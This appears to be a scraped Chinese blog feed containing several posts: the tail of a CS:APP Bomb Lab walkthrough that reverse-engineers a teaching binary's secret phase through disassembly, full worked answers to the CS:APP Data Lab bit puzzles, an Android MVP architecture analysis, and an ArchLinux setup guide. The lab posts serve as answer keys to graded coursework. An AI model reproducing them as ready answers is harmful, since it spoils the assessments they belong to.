12345678910111213141516171819202122232425262728293031323334353600000000004015c4 &lt;phase_defused&gt;: 4015c4: 48 83 ec 78 sub $0x78,%rsp 4015c8: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax 4015cf: 00 00 4015d1: 48 89 44 24 68 mov %rax,0x68(%rsp) 4015d6: 31 c0 xor %eax,%eax 4015d8: 83 3d 81 21 20 00 06 cmpl $0x6,0x202181(%rip) # 603760 &lt;num_input_strings&gt; 4015df: 75 5e jne 40163f &lt;phase_defused+0x7b&gt; 4015e1: 4c 8d 44 24 10 lea 0x10(%rsp),%r8 4015e6: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 4015eb: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 4015f0: be 19 26 40 00 mov $0x402619,%esi 4015f5: bf 70 38 60 00 mov $0x603870,%edi 4015fa: e8 f1 f5 ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 4015ff: 83 f8 03 cmp $0x3,%eax 401602: 75 31 jne 401635 &lt;phase_defused+0x71&gt; 401604: be 22 26 40 00 mov $0x402622,%esi 401609: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi 40160e: e8 25 fd ff ff callq 401338 &lt;strings_not_equal&gt; 401613: 85 c0 test %eax,%eax 401615: 75 1e jne 401635 &lt;phase_defused+0x71&gt; 401617: bf f8 24 40 00 mov $0x4024f8,%edi 40161c: e8 ef f4 ff ff callq 400b10 &lt;puts@plt&gt; 401621: bf 20 25 40 00 mov $0x402520,%edi 401626: e8 e5 f4 ff ff callq 400b10 &lt;puts@plt&gt; 40162b: b8 00 00 00 00 mov $0x0,%eax 401630: e8 0d fc ff ff callq 401242 &lt;secret_phase&gt; 401635: bf 58 25 40 00 mov $0x402558,%edi 40163a: e8 d1 f4 ff ff callq 400b10 &lt;puts@plt&gt; 40163f: 48 8b 44 24 68 mov 0x68(%rsp),%rax 401644: 64 48 33 04 25 28 00 xor %fs:0x28,%rax 40164b: 00 00 40164d: 74 05 je 401654 &lt;phase_defused+0x90&gt; 40164f: e8 dc f4 ff ff callq 400b30 &lt;__stack_chk_fail@plt&gt; 401654: 48 83 c4 78 add $0x78,%rsp 401658: c3 retq 可以看到第7行将函数num_input_strings的返回值与6进行比较，如果不等于6则的直接跳过中间代码到达最后的结束部分。 从函数名我们可以推测这个函数的作用的是检测读取的字符串的数量，当读取了6个字符串时，就不会跳过中间的代码。我们继续看中间的代码： 第9到14行又是熟悉的sscanf调用过程，我们已经知道esi指向的是格式化字符串的首地址，我们先来查看它的内容： 读取两个整数和一个字符串。 有所不同的是在12行之后又有一行给edi赋上了一个地址值，我们之前所有阶段中edi的值都是来自于我们read_line的地址，想到sscanf 参数中确实存在一个输入，我们可以推测这个edi中存放的是我们读取位置的首地址。 那么我们就可以在运行时查看这个地址的内容，看是从哪里进行读取的： 首先符号表告诉我们这段数据的名字叫做input_strings也就是我们输入的字符串，那么这个地址上的0 0代表的应该就是我们的第4行输入。两个整型数字正好与格式化字符串也是匹配的。现在我们知道，应该在这两个0之后再追加一个字符串作为输入。 第15、16行对成功输入的数据个数进行了一个判断，如果不为3个则跳过调用secret_phase的代码。 第17-19行是对strings_not_equal的调用，我们已经知道它的两个参数分别是esi与edi，esi被赋上了一个地址值，edi被赋上了esp+0x10，我们可以推测出edi的地址就是指向我们读入的第三个字符串的，那么需要比较的对象是什么呢？我们在运行时查看内存的内容： 这就是我们需要的第三个参数。 可以看到如果第三个参数与上面这个字符串相同的话就会调用两次puts输出提示信息，然后进入secret_phase阶段。 12345678910111213141516171819202122230000000000401242 &lt;secret_phase&gt;: 401242: 53 push %rbx 401243: e8 56 02 00 00 callq 40149e &lt;read_line&gt; 401248: ba 0a 00 00 00 mov $0xa,%edx 40124d: be 00 00 00 00 mov $0x0,%esi 401252: 48 89 c7 mov %rax,%rdi 401255: e8 76 f9 ff ff callq 400bd0 &lt;strtol@plt&gt; 40125a: 48 89 c3 mov %rax,%rbx 40125d: 8d 40 ff lea -0x1(%rax),%eax 401260: 3d e8 03 00 00 cmp $0x3e8,%eax 401265: 76 05 jbe 40126c &lt;secret_phase+0x2a&gt; 401267: e8 ce 01 00 00 callq 40143a &lt;explode_bomb&gt; 40126c: 89 de mov %ebx,%esi 40126e: bf f0 30 60 00 mov $0x6030f0,%edi 401273: e8 8c ff ff ff callq 401204 &lt;fun7&gt; 401278: 83 f8 02 cmp $0x2,%eax 40127b: 74 05 je 401282 &lt;secret_phase+0x40&gt; 40127d: e8 b8 01 00 00 callq 40143a &lt;explode_bomb&gt; 401282: bf 38 24 40 00 mov $0x402438,%edi 401287: e8 84 f8 ff ff callq 400b10 &lt;puts@plt&gt; 40128c: e8 33 03 00 00 callq 4015c4 &lt;phase_defused&gt; 401291: 5b pop %rbx 401292: c3 retq 可以看到第3行调用了read_line函数，接着把read_line的返回值赋给了rdi，并调用了strtol函数，这个标准库函数的作用是把一个字符串转换成对应的长整型数值。返回值还是存放在rax中，第8行将rax复制给了rbx，第9行将rax减1赋给eax，第十行与0x3e8进行比较，如果这个值小于等于0x3e8就跳过引爆代码。看到这里我们可以知道我们需要再加入一行数据，它应该是一个小于等于1001的数值。 接下来将ebx赋给了esi，也就是我们一开始输入的rax值。第14行将一个地址值赋给了edi，15行调用了fun7函数。我们还是先往下了解一下我们需要得到的结果。 函数返回后令返回值eax与0x2做了一个比较，如果相等则跳过引爆代码。 所以我们需要返回2。 下面查看fun7的代码： 1234567891011121314151617181920210000000000401204 &lt;fun7&gt;: 401204: 48 83 ec 08 sub $0x8,%rsp 401208: 48 85 ff test %rdi,%rdi 40120b: 74 2b je 401238 &lt;fun7+0x34&gt; 40120d: 8b 17 mov (%rdi),%edx 40120f: 39 f2 cmp %esi,%edx 401211: 7e 0d jle 401220 &lt;fun7+0x1c&gt; 401213: 48 8b 7f 08 mov 0x8(%rdi),%rdi 401217: e8 e8 ff ff ff callq 401204 &lt;fun7&gt; 40121c: 01 c0 add %eax,%eax 40121e: eb 1d jmp 40123d &lt;fun7+0x39&gt; 401220: b8 00 00 00 00 mov $0x0,%eax 401225: 39 f2 cmp %esi,%edx 401227: 74 14 je 40123d &lt;fun7+0x39&gt; 401229: 48 8b 7f 10 mov 0x10(%rdi),%rdi 40122d: e8 d2 ff ff ff callq 401204 &lt;fun7&gt; 401232: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401236: eb 05 jmp 40123d &lt;fun7+0x39&gt; 401238: b8 ff ff ff ff mov $0xffffffff,%eax 40123d: 48 83 c4 08 add $0x8,%rsp 401241: c3 retq 第3、4两行先对我们输入的这个数作一个判断，如果等于0直接跳到第19行，返回-1，这显然不是我们想要的结果。 第5行将rdi的值读入到了edx中，第6行则将这个数与我们读入的数进行比较，如果这个数小于等于我们读入的数就跳至第12行，第12行将eax置0，再进行一次相同的比较，如果相等则跳至第20行返回。 如果不等（也就是edx小于我们读入的数），则继续向下执行第15行，这行代码有些与之前的链表跳至下一个节点类似，到这里，我们就需要查看一下rdi这个地址里存放的是怎样一种数据结构： 仔细观察可以发现这是一个二叉树的结构，每个节点第1个8字节存放数据，第2个8字节存放左子树地址，第3个8字节存放右子树位置。并且命令也有规律，nab，a代表层数，b代表从左至右第b个节点。 根据这个结构，我们可以把树画出来以便我们进行分析。随意找了个工具表示一下： 下面我们回到代码，现在我们知道第15行代码的作用是将rdi移到它的右子树的位置，接着调用fun7，在返回后令eax = 2 * rax + 1。 如果第6行的比较中树节点的值大于我们读入的数呢？ 代码会进行到第8行，令rdi移到它的左子树的位置，接下来调用fun7在返回后令eax = 2 * eax。下面跳至返回处。 总结上面的过程：edi指向一个树的节点，令edi节点的值与我们读入的值进行比较。 如果两者相等：返回0 如果前者大于后者：rdi移至左子树，返回2 * rax 如果后者大于前者：rdi移至右子树，返回2 * rax + 1 那么我们需要返回2，应该在最后一次调用返回0，倒数第二次调用返回2 * rax + 1，第一次调用返回2 * rax。换句话说，这个数应该在第三层，比父节点大且比根结节小。观察上图，唯一的答案是： 0x16（22） 至此，炸弹全部解除： 实验小结整个实验包括秘密部分用时九个小时，引爆了3次炸弹（一次因为错误的尝试，两次因为将ni命令错打成n）。 一开始拿到题目的时候会比较蒙，需要先去学习工具的使用与一些编译的基础知道（符号表、定址表等等）花费了一些时间。前几个阶段过于关注函数的具体实现而没有根据常识去推测一些明显函数的作用花费了一些时间。 前4个阶段都算比较简单，考查了一些常用结构在汇编中的出现形式。第5、6与秘密阶段分别考察了堆、链表、二叉树这三个数据结构在内存中的结构与汇编级的使用，受益良多。 这个实验需要细致的分析与大胆的猜测与实验验证，还需要小心操作，最重要的是耐心，面对非常晦涩的汇编代码如何一步步地弄清代码的作用很需要毅力。当然也可以通过自己写出等价的C代码来帮助自己理解。","tags":[{"name":"Computer System","slug":"Computer-System","permalink":"http://www.viseator.com/tags/Computer-System/"},{"name":"CS:APP","slug":"CS-APP","permalink":"http://www.viseator.com/tags/CS-APP/"}]},{"title":"深入理解计算机系统（CS:APP) - Data Lab详解","date":"2017-06-18T07:01:01.000Z","path":"2017/06/18/CS_APP_DataLab/","text":"关于CS:APP《深入理解计算机系统》(Computer Systems: A Programmer’s Perspective;CS:APP)这本书作为CMU核心课程的核心教材，一直被众人所推崇。这本书的主要内容就如它的英文名称那样：以一个程序员的视角看待计算机系统（现在的中文书名翻译给人一种这本书非常精深的错觉）。实际上这本书的内容并没有太过于深入，并且一直都作为计算机科学与技术专业低年级的计算机基础课来开设。所需要的前置知识也不是很多，一般来说学习过C语言之后就可以看了，并不需要提前学习汇编（本书第三章会讲解汇编的基础内容）。但个人感觉在学习过王爽的8086汇编以后学习本书的汇编会顺利不少。 我在三月份时得知本书第三版的英文版即将出版就早早预订了（第三版中文翻译版早已出版），苦苦等待一个月以后终于如愿成为了这版CS:APP的第一批读者。 读这本书的感受第一就是非常地爽，可以说这本书可以引领你从表层的程序一直深入到计算机内部的运作方式中，里面对于一些概念的理解也是给人一种前所未有的透彻感觉（溢出的图形表示、补码的权值理解等等）都切中了问题的本质。 除了书本上的内容，CMU的课程官网上还提供了9个lab，这9个lab也一直深受CMU开设的课程的学生们的喜爱，在lab中我们可以将在各章中学习到的知识运用到解决一个有趣的问题中，并且通过自动化的评分机制评估对知识的掌握程度。这9个lab同样是这本书的核心内容。 Data Lab实验代码见GitHub 简介在严格限制的条件下实现简单的逻辑、补码、浮点数操作函数。 本lab旨在帮助学生理解C中各类型的位表示和操作符对数据的位级作用行为。 所用工具VS Code-用于代码编写gcc-用于编译 第一部分 整数所编写的程序必须满足如下要求： 只能使用0-255的整型常数 只能使用函数参数与函数内声明的局部变量 只能使用如下单目操作符：! ~ 只能使用如下双目操作符：&amp; ^ | + &lt;&lt; &gt;&gt; 最多只能使用有限个运算符（等于号、括号不计），可以认为使用的运算符个数越少得分越高 一些函数可能对操作符有更多的限制（在题目前以操作符限制给出） 禁止使用任何控制结构如 if do while for switch等 禁止定义或使用任何宏 禁止定义任何函数 禁止调用任何函数（除了可以使用printf输出中间变量，但提交时必须去掉） 禁止使用任何形式的类型转换 禁止使用int以外的任何类型（包括结构体、数组、联合体） 可以假设程序在如下环境的机器上运行： 采用补码表示整型 32位int 执行算术右移 右移超过类型的长度时的行为未定义 bitAnd 要求：只用~ |实现x&amp;y 操作符限制：~ | 操作符使用数量限制：8 思路：略 1int bitAnd(int x, int y) &#123; return ~((~x) | (~y)); &#125; getByte 要求：取出x中的n号字节 编号从低位到高位从0开始 操作符使用数量限制：6 思路：将x右移n*8位之后取出低8位的值 1int getByte(int x, int n) &#123; return (x &gt;&gt; (n &lt;&lt; 3)) &amp; 0xff; &#125; logicalShift 要求：将x逻辑右移n位（0&lt;=n&lt;=31) 操作符使用数量限制：20 思路：将x的最高位除去后右移n位（保证高位补0），然后使用|操作符手动将最高位移动到的位置置上x的最高位。 1234int logicalShift(int x, int n) &#123; int a = 1 &lt;&lt; 31; return ((x &amp; ~a) &gt;&gt; n) | ((!!(x &amp; a)) &lt;&lt; (32 + ~n));&#125; bitCount 要求：统计x的二进制表示中1的数量 操作符使用数量限制：40 思路： 做这道题参考了stackoverflow上的一个回答，核心思想是分治： 将所有位分成32组，一组中只有1位 将相邻两组合为一组，组中的数值为原来两组中的数值相加 重复第2步，直到合成只有1组，组中的数值即为结果 用图片比较便于理解： 可以看到最终的0x0000000F即为1的数量15 该算法能成功的关键在于一开始中每组中的数值即为每组中1的数量，然后将相邻两组中的数值相加的过程就相当于将之前一级的1的数量汇总，不断重复这个过程就可以将1的数量汇总到最后的一个数中。 有了算法我们还要考虑如何在题目的限制条件下实现这一算法。 为了实现将相邻两组中的值相加并放在合适的位置，我们采用掩码+位移的方式，例如有掩码： int mask1 = 0x55555555 (0101...0101) 那么x = x &amp; mask1 + (x &gt;&gt; 1) &amp; mask1;实现了相加的过程，前面一部分先取出了一半的组，右移后再取出的就是后一半的组，再由按位相加的特点，它们相加后的值就存放在特定的位上（可以参照上面的图理解这一过程）。 接下来只要使用不同的掩码和不同的位移就可以一步步实现这一过程。 但是题目限制中我们只能使用0x00-0xFF的整型值，所以掩码也需要我们进行构造。 答案如下，注意到当剩下4组，每组8位的时候我们就可以直接位移相加再取出低8位得到它们的和。 12345678910111213141516171819int bitCount(int x) &#123; // referenced : // https://stackoverflow.com/questions/3815165/how-to-implement-bitcount-using-only-bitwise-operators int mask1 = 0x55; int mask2 = 0x33; int mask3 = 0x0F; int result = 0; mask1 = mask1 | (mask1 &lt;&lt; 8); mask1 = mask1 | (mask1 &lt;&lt; 16); mask2 = mask2 | (mask2 &lt;&lt; 8); mask2 = mask2 | (mask2 &lt;&lt; 16); mask3 = mask3 | (mask3 &lt;&lt; 8); mask3 = mask3 | (mask3 &lt;&lt; 16); result = (x &amp; mask1) + ((x &gt;&gt; 1) &amp; mask1); result = (result &amp; mask2) + ((result &gt;&gt; 2) &amp; mask2); result = (result &amp; mask3) + ((result &gt;&gt; 4) &amp; mask3); return (result + (result &gt;&gt; 8) + (result &gt;&gt; 16) + (result &gt;&gt; 24)) &amp; 0xff;&#125; bang 要求：不使用!实现!操作符 操作符限制：~ &amp; ^ | + &lt;&lt; &gt;&gt; 操作符使用数量限制：12 思路： !操作符的含义是0变为1，非0变为0，我们自然可以想到要做的是区分非零和零，零相对的非零数有一个非常明显的特征是-0=0，而对于非零数，取负后必定是一正一负而不可能相等，利用这一点，可以得出非零数与它的相反数进行|运算后符号位一定为1，我们将符号位取出并取反就可以返回正确的值。 1int bang(int x) &#123; return 1 &amp; (1 ^ ((x | (~x + 1)) &gt;&gt; 31)); &#125; tmin 要求：返回补码表示的整型的最小值 操作符使用数量限制：4 思路：按照补码的权值理解，只要将权为-32的位置为1即可 1int tmin(void) &#123; return 1 &lt;&lt; 31; &#125; fitBits 要求：如果x可以l只用n位补码表示则返回1，否则返回0 1 &lt;= n &lt;= 32 操作符使用数量限制：15 思路： 如果x可以用n位补码表示，那么左移多余的位的个数后再右移回来的数值一定与原值相等，这个方法利用了左移后溢出的位会被丢弃，而右移回来时的是补符号位，如果丢弃了1或者右移时补的是1都会导致值的改变，而这两种情况也正说明了x不可以只用n位补码表示。 1234int fitsBits(int x, int n) &#123; int a = 33 + ~n; return !((x &lt;&lt; a &gt;&gt; a) ^ x);&#125; divpwr2 要求：计算x/(2^n) 0 &lt;= n &lt;= 30 结果向零取整 操作符使用数量限制：15 思路：对于正数，我们直接把x右移n位就可以得到向零取整的结果（实际上是向下取整）；对于负数，虽然我们右移n位可以得到结果，但是这个结果是向下取整的，所以我们需要适当地加上1来补为向零取整，那么我们什么时候需要加1呢？整除时当然不用，在不能整除时就都需要加上1来调整，如何判断是否整除？只要移出的位中有一个不为0，那么就表示无法整除。​123456int divpwr2(int x, int n) &#123; int a = 1 &lt;&lt; 31; int isALessThanZero = !!(x &amp; a); int isXHasMoreBit = (!!((~(a &gt;&gt; (32 + ~n))) &amp; x)); return (x &gt;&gt; n) + (isXHasMoreBit &amp; isALessThanZero);&#125; negate 要求：计算-x 操作符使用数量限制：5 思路：略。1int negate(int x) &#123; return ~x + 1; &#125; isPositive 要求：如果x大于0返回1，否则返回0 操作符使用数量限制：8 思路：检测符号位与x是否为0即可。1int isPositive(int x) &#123; return !((x &amp; (1 &lt;&lt; 31)) | !x); &#125; isLessOrEqual 要求：如果x小于等于y则返回1，否则返回0 操作符使用数量限制：24 思路：本题的基本思路是判断x-y得到的值是否小于等于0，但是要考虑溢出带来的影响，首先定义了两个变量xp,yp分别表示x,y是否大于等于0。return的表达式的含义为并并非x大于等于0且y小于0的情况下（&amp;的后半部分），如果x-y小于或等于0或x小于零且y大于等于0，则返回1。1234567int isLessOrEqual(int x, int y) &#123; int t = 1 &lt;&lt; 31; int xp = !(x &amp; t); int yp = !(y &amp; t); int p = x + ~y + 1; return (!!(((!xp) &amp; yp) | ((p &amp; t) | !p))) &amp; (!(xp &amp; (!yp)));&#125; ilog2 要求：返回x求以2为底的对数的结果 向下取整 操作符使用数量限制：90 思路：本题参照了陈志浩学长的答案。解题算法的核心思想是二分查找，首先我们要明白这道题实际上想让我们求的是什么，经过观察我们可以得出结论，一个数求以2为底的对数的结果就相当于它二进制中位置最高的1的序号（序号从零开始由低位到高位）。那么我们需要做的就是查找并记录这个位置最高的1的位置。算法过程如下： 如果x &gt;&gt; 16的结果大于0，那么可以说明最高位的位置至少是16，那么我们可以将结果的第4位置1（序号编号规则同上），因为2 ^ 4 = 16，反之置0说明结果小于16. 下面考虑两种情况，如果第1步中x &gt;&gt; 16 大于0，说明我们需要在16位之后的第8位（第24位，相当于再二分）再进行二分查找，如果x &gt;&gt; 16小于0，那我们需要在16位之前的第8位（第8位，相当于再二分）进行查找，那么我们可以得出，下次查找时的范围为x &gt;&gt; (8 + result) (result表示上一步得到的结果（0或16）)，这个+result的意义可以认为是重新确定开始进一步二分查找的位置。如果x &gt;&gt; (8 + result) 的结果大于0，那么说明结果（result)的第3位必为1，相当于在结果上加上了查找到的新位置，反之第3位应该仍为0. 按照上面的思路继续查找到不能再二分（偏移为x &gt;&gt; (1 + reuslt)），此时result中得到最终的最高位的位置。算法描述起来比较难，参照代码推理几次就可以明白其中的巧妙之处：123456789101112131415161718int ilog2(int x) &#123; int result = 0; int b4 = !!(x &gt;&gt; 16); int b3 = 0; int b2 = 0; int b1 = 0; int b0 = 0; result = b4 &lt;&lt; 4; b3 = !!(x &gt;&gt; (8 + result)); result = result | (b3 &lt;&lt; 3); b2 = !!(x &gt;&gt; (4 + result)); result = result | (b2 &lt;&lt; 2); b1 = !!(x &gt;&gt; (2 + result)); result = result | (b1 &lt;&lt; 1); b0 = !!(x &gt;&gt; (1 + result)); result = result | b0; return result;&#125; 第二部分 浮点数所编写的程序必须满足如下要求： 只能使用函数参数与函数内声明的局部变量 最多只能使用有限个运算符（等于号、括号不计），可以认为使用的运算符个数越少得分越高 禁止定义或使用任何宏 禁止定义任何函数 禁止调用任何函数（除了可以使用printf输出中间变量，但提交时必须去掉） 禁止使用任何形式的类型转换 禁止使用int、unsigned以外的任何类型（包括结构体、数组、联合体） 禁止定义或使用任何浮点常量 也就是说在浮点数题目中，我们可以使用任意大小的整型数值，可以使用流程控制语句，可以使用任何操作符。 float_neg 要求：返回-f的位级表示 本题及以下所有的题目都采用unsigned int来存放位级表示 所有的浮点类型都为float 如果输入为NaN，返回NaN 操作符使用数量限制：10 思路：对于一般的浮点数，我们只需要对它的符号位取反就可以了。需要特殊处理的只是无穷与NaN这两种非规格化的情况 1234567unsigned float_neg(unsigned uf) &#123; unsigned result = uf ^ 0x80000000; if ((uf &amp; 0x7F800000) == 0x7F800000 &amp;&amp; (uf &amp; 0x007FFFFF)) &#123; result = uf; &#125; return result;&#125; float_i2f 要求：实现由int到float的类型转换 操作符使用数量限制：30 思路： 由于浮点数的表示中对于负数并没有使用补码的方式，正负号完全取决于符号位，所以对于负数输入，我们需要做的第一步工作就是把它取负为正数再进行后面的操作。在这个过程我们需要记录下正负，在之后的操作中需要使用。 由于浮点数与整数表示的不同，浮点数的有效数字的位置在第0-22位的23位中，并且第一个1在规格化表示中会被省略，我们只需要第一个1以后的位数，并且我们需要知道在浮点数表示中它的指数应该为多少，所以在这个过程中我们同时需要记录第一个1出现的位置并以此决定指数。 在代码中使用了一个i来记录左移的位数，也就是最高位的1之前的零的个数，那么32-i就是最后的指数。 在循环中我们将整数的有效数字提前到了最前，然后将最高位移出， 这时我们用temp保存这时的状态。供之后的舍入判断使用。 接下来，我们需要将有效位移到正确的位置上，也就是向右位移9位。 下面按照之前的记录把符号位置上正确的值。 现在已经处理好有效数字与符号部分，下面要做的就是处理指数部分。 之前说过32-i是指数的数值，注意我们需要将这个值加上偏移量127，再放入表示指数的位置中。 下面就要处理舍入的情况了，浮点数表示的舍入规则比较特殊，也是本题的难点。结合本题的情况进行介绍： 在右移之前我们保存了这时的状态，因为当右移九位后原来的低九位如果有数据就会被舍弃，我们就需要根据舍弃的这九位与未被舍弃的最后一位（也就是原数第9位，下称第9位）来判断舍入的情况。 如果舍弃的这九位的最高位为0，那么说明舍去的数值小于保留下来的最低位表示的值的二分之一，那么我们不需要舍入。 如果舍弃的这九位的最高位为1，并且后面的位有数值，那么说明舍去的数值大于第9位表示的值的二分之一，这个时候我们需要舍入，也就是把最终结果加一。 如果舍弃的这九位的最高位为1，并且后面的位都是0，这个时候正好就是第9位表示的值的二分之一。那么这个时候我们就要看第9位，如果第9位为0，那么不舍入。如果第9位为1，那么进行舍入，也就是把最终结果加一。 12345678910111213141516171819202122232425262728293031323334353637383940unsigned float_i2f(int x) &#123; int i = 1; int nega = 0; unsigned temp; unsigned result; if (x &amp; 0x80000000) &#123; nega = 1; x = ~x + 1; &#125; if (x == 0) &#123; return 0; &#125; while ((x &amp; 0x80000000) != 0x80000000) &#123; ++i; x &lt;&lt;= 1; &#125; result = x &lt;&lt; 1; temp = result; result &gt;&gt;= 9; if (nega) &#123; result |= 0x80000000; &#125; else &#123; result &amp;= 0x7FFFFFFF; &#125; i = (32 - i) + 127; result = (result &amp; 0x807FFFFF) | (i &lt;&lt; 23); if ((temp &amp; 0x00000100) == 0x00000100) &#123; if (temp &amp; 0x000000FF) &#123; return result + 1; &#125; else &#123; if (result &amp; 1) &#123; return result + 1; &#125; else &#123; return result; &#125; &#125; &#125; return result;&#125; float_twice 要求：返回2*f的位级表示 操作符使用数量限制：30 思路： 如果该浮点数是非规格化的，那么我们需要将它的有效数字部分左移一位就可以达到乘二的效果，这个过程需要注意两个地方，第一是如果左移后如果有效数字的最高位溢出了，那么正好移到了指数部分成为了一个规格化的表示形式，所以我们无需担心左移后有效数字溢出的问题。第二是左移后会导致符号位被移出，我们需要在位移之后手动置上原来的符号位。 如果该浮点数是规格化的，那么我们只需要将它的指数部分加一。 其他情况的应该直接返回原值。 实验小结作为CS:APP的第一个lab，绝大部分的题目在经过仔细思考与测试后是可以自主完成的，但是其中的bitCount与ilog2由于需要使用分治与二分查找的算法，自己想出来的难度还是比较大的，在卡了两天以后还是去查了答案。","tags":[{"name":"Computer System","slug":"Computer-System","permalink":"http://www.viseator.com/tags/Computer-System/"},{"name":"CS:APP","slug":"CS-APP","permalink":"http://www.viseator.com/tags/CS-APP/"}]},{"title":"Android Google官方MVP架构分析","date":"2017-05-25T12:54:08.000Z","path":"2017/05/25/android_google_mvp/","text":"写在前面关于MVP模式的基本介绍与优缺点可以参见下面这篇文章： https://segmentfault.com/a/1190000003927200 本文的重点是对Google官方写的一个MVP架构实现的Demo进行简单的分析来看看谷歌实现的Android MVP架构是怎么搭建的。 谷歌官方的架构Demo地址： https://github.com/googlesamples/android-architecture 本文所讲解的为： https://github.com/googlesamples/android-architecture/tree/todo-mvp 需要读者参照源码查看本文。 我将这个todo应用的框架提炼出来（同时也意味着丢失了很多的实现细节，但可以将架构看得更加清晰），制作了一张伪UML图（为了简化，没有遵循UML的规范），下面我们参照着表中的内容进行分析： BaseView与BasePresenter可以看到它们是独立于包外的两个基础接口，之后的所有View与Presenter接口都将继承它们，所以应该将一些通用的方法写在这两个Base接口中。 tasks包整个app中tasks、taskdetail、statistics三个包对应着的就是三个Activity，可以看到每一个包中包含了对应的Activity、View 、Presenter与Contract类和其他工具组件，通过这样的方式构成了应用的一个组成单元（每一个Activity与其对应的View和实现逻辑的Presenter）。 图中我只展现了tasks这一个包，其他的包内部的结构也是一样的。 TasksContract接口TasksContract接口包含两个接口，分别是继承了BaseView与BasePresenter的View与Presenter。 我们可以将Contract接口视为管理View与Presenter需要实现的方法的汇总接口，这些方法在实例类中实际上都是通过接口来进行调用的，这样就可以避免依赖于某一个特定类的方法来进行处理，从而可以有多种实现View与Presenter的方式，便于进行单元测试（可以看到源代码中就有很多单元测试的内容，但是在这篇文章中我们将它们忽略）。 一切与更新UI有关的逻辑都应该放在TasksContract.View接口中。 一切与业务有关的逻辑都应该放在TaskContract.Presenter接口中。 TasksFragment与TasksPresenterTasksFragment与TaskPresenter分别是TasksContract.View与TaskContract.Presenter接口的实例。 TaskActivity在初始化时会先创建TasksFragment实例，再将其作为构造参数传递给TaskPresenter，TaskPresenter在构造方法中又会调用TasksFragment的setPresenter方法将自身传递给TasksFragment。这样Presenter与View就分别存有了一份对方的引用。 构造完成后，当用户与UI进行交互，View一律调用Presenter的相关方法来进行交互事件的处理或请求数据更新。如果有新的内容需要呈现在UI上，则由Presenter调用View的相关方法来进行更新。Presenter则负责与上一级的数据存储池进行交互来更新数据或是获取新的数据。 可以看到Presenter充当了一个“中介”，View的所有请求都将交由Presenter进行处理，而View现在需要做的只有提供相应方法供Presenter进行调用，避免了将大量业务逻辑写在View中。同时也避免了View与数据的直接交互，而是由Presenter“单线操作”，降低了耦合度。 Data包Task这里的Task是一个POJO类，用于表示储存的数据。 source包TaskDataSource接口TaskDataSource接口定义了所有可以的用于操作数据的对象的方法，换句话说，无论数据的来源是什么，我们都可以通过调用实现了这个接口的对象的方法来操纵数据。 GetTaskCallback与LoadTasksCallback注意到用于获取数据的方法的参数都利用了callback进行回调来传递数据。这样做主要因为数据的获取有可能是异步的，使用回调机制可以避免线程因为等待数据而阻塞。 local包与remote包这两个包分别存放着一个实现了TaskDataSource接口的类，他们就代表了从本地缓存获取数据与从远端获取数据。当然与获取数据有关的其他类也应该放在这个包下。 TaskRepository有了从本地与远端获取数据的类，那么就应该有一个类对它们进行管理，我们希望的是有本地缓存时读取本地缓存，没有时就从远端的获取数据。在更为复杂的情况下，我们需要处理来自远端的请求并与本地的数据进行同步。 TaskRepository就是用于管理所有的这些数据来源并统一成一个TaskDataSource暴露给Presenter来操作数据，而这些数据管理逻辑就被隐藏在了TaskRepository中。 值得注意的是，源码中在TaskRepository中还实现了一个内存缓存，可以避免从其他两个低速来源中获取数据。","tags":[{"name":"Android","slug":"Android","permalink":"http://www.viseator.com/tags/Android/"},{"name":"MVP","slug":"MVP","permalink":"http://www.viseator.com/tags/MVP/"},{"name":"Architecture","slug":"Architecture","permalink":"http://www.viseator.com/tags/Architecture/"}]},{"title":"ArchLinux安装后的必须配置与图形界面安装教程","date":"2017-05-19T13:38:57.000Z","path":"2017/05/19/arch_setup/","text":"ArchLinux安装后的必须配置在上一篇教程中，我们成功地安装了ArchLinux，这时系统处于一个非常精简的状态，为了日常使用，我们必须进行一些配置、安装一些需要的组件，来扩展我们的系统功能，开源的组件相互协同工作也是Linux的迷人之处之一。 下面的教程部分参考了官方General recommendations。 连接网络现在我们是在新安装的系统上进行操作，所以我们要重新联网，我们在之前安装系统时已经提前装好了相关的包。所以现在只要跟之前一样： 如果你是有线网并且路由器支持DHCP的话插上网线后先执行以下命令获取IP地址： 1dhcpcd 无线网： 1wifi-menu 按界面提示进行操作就可以了。 同样可以使用ping命令来测试是否正常联网。 创建交换文件交换文件可以在物理内存不足的时候将部分内存暂存到交换文件中，避免系统由于内存不足而完全停止工作。 之前我们通常采用单独一个分区的方式作为交换分区，现在更推荐采用交换文件的方式，更便于我们的管理。 分配一块空间用于交换文件，执行： 1fallocate -l 512M /swapfile （请将512M换成需要的大小，只能以M或G为单位） 交换文件的大小可以自己决定，推荐4G以下的物理内存，交换文件与物理内存一致，4G以上的物理内存，交换文件4-8G。 更改权限，执行： 1chmod 600 /swapfile 设置交换文件，执行： 1mkswap /swapfile 启用交换文件，执行： 1swapon /swapfile 最后我们需要编辑/etc/fstab为交换文件设置一个入口，使用vim打开文件： 1vim /etc/fstab 注意编辑fstab文件的时候要格外注意不要修改之前的内容，直接在最后新起一行加入以下内容： 1/swapfile none swap defaults 0 0 新建用户在这之前所有操作都是以root用户的身份进行的，由于root的权限过高，日常使用root用户是不安全的。Linux为我们提供了强大的用户与组的权限管理，提高了整个系统的安全性。这里我们就来新建一个用户。 执行以下命令来创建一个名为username的用户（请自行替换username为你的用户名）： 1useradd -m -G wheel username （请自行替换username为你的用户名） 在这里稍微解释一下各参数的含义： -m：在创建时同时在/home目录下创建一个与用户名同名的文件夹，这个目录就是你的家目录啦！家目录有一个别名是~，你可以在任何地方使用~来代替家目录路径。这个神奇的目录将会用于存放你所有的个人资料、配置文件等所有跟系统本身无关的资料。这种设定带来了诸多优点： 只要家目录不变，你重装系统后只需要重新安装一下软件包（它们一般不存放在家目录），然后所有的配置都会从家目录中读取，完全不用重新设置软件着。 你可以在家目录不变的情况下更换你的发行版而不用重新配置你的环境。 切换用户后所有的设置会从新的用户的家目录中读取，将不同用户的资料与软件设置等完全隔离。 有些著名的配置文件比如vim的配置文件~/.vimrc，只要根据自己的使用习惯配置一次， 在另一个Linux系统下（例如你的服务器）把这个文件复制到家目录下，就可以完全恢复你的配置。 -G wheel：-G代表把用户加入一个组，对用户与组的概念感兴趣的同学可以自行查找有关资料学习。后面跟着的wheel就是加入的组名，至于为什么要加入这个组，后面会提到。 